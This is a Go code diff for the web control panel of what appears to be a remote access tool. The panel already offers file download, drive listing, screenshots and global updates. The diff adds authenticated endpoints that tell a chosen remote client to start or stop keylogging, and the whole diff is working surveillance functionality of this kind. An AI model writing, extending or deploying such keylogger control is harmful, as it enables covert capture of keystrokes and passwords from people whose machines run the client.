@@ -1136,6 +1136,8 @@ func (wh *WebHandler) RegisterGinRoutes(router *gin.Engine) {
 	router.POST("/api/files/drives", wh.ginRequireAuth(wh.ginHandleGetDrives))
 	router.POST("/api/files/download", wh.ginRequireAuth(wh.ginHandleFileDownload))
 	router.GET("/api/screenshot", wh.ginRequireAuth(wh.ginHandleScreenshotRequest))
+	router.POST("/api/keylogger/start", wh.ginRequireAuth(wh.ginHandleKeyloggerStart))
+	router.POST("/api/keylogger/stop", wh.ginRequireAuth(wh.ginHandleKeyloggerStop))
 	router.POST("/api/update/global", wh.ginRequireAuth(wh.ginHandleGlobalUpdate))
 
 	// Clients UI optimization endpoints
@@ -1323,4 +1325,98 @@ func (wh *WebHandler) ginHandleClientSearchAPI(c *gin.Context) {
 		return
 	}
 	wh.HandleClientSearchAPI(c.Writer, c.Request)
+}
+
+// HandleKeyloggerStart handles keylogger start requests
+func (wh *WebHandler) HandleKeyloggerStart(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ClientID string `json:"client_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+
+	if req.ClientID == "" {
+		http.Error(w, "Client ID required", http.StatusBadRequest)
+		return
+	}
+
+	// Send start keylogger message to client
+	msg, err := protocol.NewMessage(protocol.MsgTypeStartKeylogger, protocol.KeyloggerPayload{})
+	if err != nil {
+		log.Printf("Failed to create start keylogger message: %v", err)
+		http.Error(w, "Failed to create request", http.StatusInternalServerError)
+		return
+	}
+
+	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
+		log.Printf("Failed to send start keylogger message to %s: %v", req.ClientID, err)
+		http.Error(w, "Failed to send request", http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status":  "started",
+		"message": "Keylogger started",
+	})
+	log.Printf("Keylogger started for client %s", req.ClientID)
+}
+
+// HandleKeyloggerStop handles keylogger stop requests
+func (wh *WebHandler) HandleKeyloggerStop(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ClientID string `json:"client_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+
+	if req.ClientID == "" {
+		http.Error(w, "Client ID required", http.StatusBadRequest)
+		return
+	}
+
+	// Send stop keylogger message to client
+	msg, err := protocol.NewMessage(protocol.MsgTypeStopKeylogger, protocol.KeyloggerPayload{})
+	if err != nil {
+		log.Printf("Failed to create stop keylogger message: %v", err)
+		http.Error(w, "Failed to create request", http.StatusInternalServerError)
+		return
+	}
+
+	if err := wh.clientMgr.SendToClient(req.ClientID, msg); err != nil {
+		log.Printf("Failed to send stop keylogger message to %s: %v", req.ClientID, err)
+		http.Error(w, "Failed to send request", http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status":  "stopped",
+		"message": "Keylogger stopped",
+	})
+	log.Printf("Keylogger stopped for client %s", req.ClientID)
+}
+
+// Gin wrapper for HandleKeyloggerStart
+func (wh *WebHandler) ginHandleKeyloggerStart(c *gin.Context) {
+	if wh == nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
+		return
+	}
+	wh.HandleKeyloggerStart(c.Writer, c.Request)
+}
+
+// Gin wrapper for HandleKeyloggerStop
+func (wh *WebHandler) ginHandleKeyloggerStop(c *gin.Context) {
+	if wh == nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
+		return
+	}
+	wh.HandleKeyloggerStop(c.Writer, c.Request)
 }
